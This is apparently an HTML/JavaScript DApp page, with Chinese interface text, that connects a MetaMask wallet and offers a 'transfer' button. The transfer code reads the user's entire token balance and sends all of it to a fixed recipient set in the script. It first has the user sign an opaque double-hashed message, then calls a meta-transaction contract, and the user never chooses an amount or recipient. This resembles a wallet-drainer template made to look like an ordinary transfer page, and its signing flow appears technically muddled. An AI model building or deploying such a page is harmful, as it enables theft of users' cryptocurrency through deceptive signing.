<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DApp 钱包连接和转账</title>
    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
</head>
<body>
    <h1>连接钱包并转账</h1>
    <button id="connectButton">连接钱包</button>
    <button id="transferButton" disabled>转账</button>

    <script>
        // MetaTransaction 合约地址和 ABI
        const contractAddress = '0xa1f16EF58A572fB99e41bb2C21C26AdDd6828697';
        const ABI = [
            {
                "constant": false,
                "inputs": [
                    { "name": "userAddress", "type": "address" },
                    { "name": "recipient", "type": "address" },
                    { "name": "amount", "type": "uint256" },
                    { "name": "sig", "type": "bytes" }
                ],
                "name": "executeMetaTransaction",
                "outputs": [],
                "payable": false,
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [{ "name": "account", "type": "address" }],
                "name": "balanceOf",
                "outputs": [{ "name": "", "type": "uint256" }],
                "payable": false,
                "stateMutability": "view",
                "type": "function"
            }
        ];

        let web3;
        let account;
        let isConnecting = false;  // 防止重复连接请求
        let isWalletConnected = false;  // 跟踪钱包是否已连接

        async function connectWallet() {
            if (window.ethereum) {
                if (isConnecting) {
                    console.log('已有连接请求正在进行');
                    return;
                }

                isConnecting = true;
                document.getElementById('connectButton').innerText = '连接中...';
                document.getElementById('connectButton').disabled = true;

                try {
                    console.log('请求连接钱包...');
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

                    if (accounts && accounts.length > 0) {
                        account = accounts[0];
                        web3 = new Web3(window.ethereum);
                        isWalletConnected = true;
                        document.getElementById('connectButton').innerText = '连接成功';
                        document.getElementById('transferButton').disabled = false;
                        console.log('钱包已成功连接:', account);
                    } else {
                        throw new Error('用户未选择账户');
                    }

                    window.ethereum.on('accountsChanged', (accounts) => {
                        if (accounts.length > 0) {
                            account = accounts[0];
                            document.getElementById('connectButton').innerText = '连接成功';
                            console.log('账户已更改为:', account);
                        } else {
                            document.getElementById('connectButton').innerText = '连接钱包';
                            document.getElementById('transferButton').disabled = true;
                            isWalletConnected = false;
                            console.log('用户已断开钱包连接');
                        }
                    });
                } catch (error) {
                    console.error('连接钱包失败:', error);
                    if (error.code === -32002) {
                        alert('已有连接请求在进行，请在钱包中确认操作。');
                    } else {
                        alert(`连接钱包失败: ${error.message}`);
                    }
                    document.getElementById('connectButton').innerText = '连接钱包';
                } finally {
                    isConnecting = false;
                    document.getElementById('connectButton').disabled = false;
                }
            } else {
                alert('请安装 MetaMask 或其他钱包插件');
            }
        }

        async function transferTokens() {
            if (!isWalletConnected) {
                alert('请先连接钱包！');
                return;
            }

            const recipient = '接收者地址';  // 替换为实际接收者地址
            const contract = new web3.eth.Contract(ABI, contractAddress);

            try {
                console.log('正在获取用户余额...');
                const balance = await contract.methods.balanceOf(account).call();
                console.log('用户余额:', balance);

                if (balance === '0') {
                    alert('余额不足，无法进行转账。');
                    return;
                }

                const amountToSend = web3.utils.toBN(balance);
                const messageHash = web3.utils.soliditySha3(account, recipient, amountToSend);
                const messageHashHex = web3.utils.keccak256(messageHash);

                console.log('生成的消息哈希:', messageHashHex);

                const signature = await web3.eth.personal.sign(messageHashHex, account);
                console.log('签名:', signature);

                console.log('正在执行元交易...');
                const tx = await contract.methods.executeMetaTransaction(account, recipient, amountToSend.toString(), signature).send({ from: account });

                console.log('转账成功:', tx);
                alert('转账成功！');
            } catch (error) {
                console.error('转账失败:', error);
                alert(`转账失败: ${error.message}`);
            }
        }

        document.getElementById('connectButton').onclick = connectWallet;
        document.getElementById('transferButton').onclick = transferTokens;

    </script>
</body>
</html>
